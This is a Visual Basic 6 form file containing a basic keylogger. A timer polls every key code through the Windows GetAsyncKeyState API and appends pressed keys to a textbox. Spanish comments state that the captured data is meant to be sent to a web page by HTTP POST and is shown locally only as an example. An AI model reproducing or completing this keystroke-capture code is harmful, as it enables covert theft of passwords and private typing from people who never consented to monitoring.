VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3090
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   3090
   ScaleWidth      =   4680
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text1 
      Height          =   2055
      Left            =   120
      TabIndex        =   0
      Text            =   "Text1"
      Top             =   840
      Width           =   4455
   End
   Begin VB.Timer Timer1 
      Left            =   240
      Top             =   240
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Declare Function GetAsyncKeyState _
     Lib "user32" ( _
         ByVal vKey As Long) As Integer


Private Sub Form_Load()
 'carga el timer cada tiempo
 Timer1.Interval = 50
End Sub

Private Sub Timer1_Timer()
' el timer detecta cada cierto tiempo la tecla
Dim numerodeteclas As Integer
For numerodeteclas = 0 To 255
'GetAsyncKeyState detecta el estado de la tecla presionada
If GetAsyncKeyState(numerodeteclas) = -32767 Then
'Aqui envia los datos por medio de http post a una pagina web
' ahorita los escirbe en el textbox para ejemplo
Text1.Text = Text1.Text + Chr(numerodeteclas)
End If
Next
End Sub
